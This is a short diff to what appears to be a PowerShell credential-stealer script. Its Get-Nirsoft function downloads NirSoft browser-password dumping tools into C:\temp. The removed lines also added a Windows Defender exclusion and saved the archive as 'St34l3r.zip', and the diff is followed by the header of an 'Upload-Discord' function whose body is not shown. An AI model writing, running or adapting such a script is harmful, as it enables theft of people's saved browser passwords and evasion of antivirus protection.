@@ -2,11 +2,10 @@ function Get-Nirsoft {
     cd C:\
     mkdir \temp
     cd \temp
-    Add-MpPreference -ExclusionPath "C:\temp"
-    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/alpha/'} -Uri https://www.nirsoft.net/alpha/lostmypassword-x64.zip -OutFile St34l3r.zip
+    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
-    .\7z\7za.exe e St34l3r.zip
+    .\7z\7za.exe e wbpv.zip
 }
 
 function Upload-Discord {
